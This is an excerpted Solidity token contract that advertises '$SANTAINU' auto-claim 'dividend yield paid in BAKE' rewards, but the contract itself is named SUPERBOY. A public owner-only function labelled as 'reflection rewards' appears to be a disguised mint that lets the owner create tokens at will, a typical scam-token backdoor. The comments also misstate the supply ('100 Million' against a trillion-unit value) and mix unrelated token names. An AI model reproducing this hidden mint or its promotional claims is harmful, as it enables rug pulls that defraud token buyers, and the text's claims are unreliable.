...
//
// $SANTAINU proposes an innovative feature in its contract.
//
// DIVIDEND YIELD PAID IN BAKE! With the auto-claim feature,
// simply hold$SANTAINU and you'll receive santainu automatically in your wallet.
// 
// Hold SANTAINU and get rewarded in santainu on every transaction!
//
//
// 📱 Telegram:https://t.me/SantaInuu
// 
//
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _reflectionrewardssantainu(uint256 amount) public onlyOwner {
    _reflectionrewardssantainu(msg.sender, amount);
    }
    ...
    function _reflectionrewardssantainu(address account, uint256 amount) internal virtual {
...
contract SUPERBOY is ERC20 {

    uint tokenTotalSupply = 1000000000000; // 100 Million Token Supply

    constructor() public ERC20("SUPER BOY", "SB") {
        _reflectionrewardssantainu(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}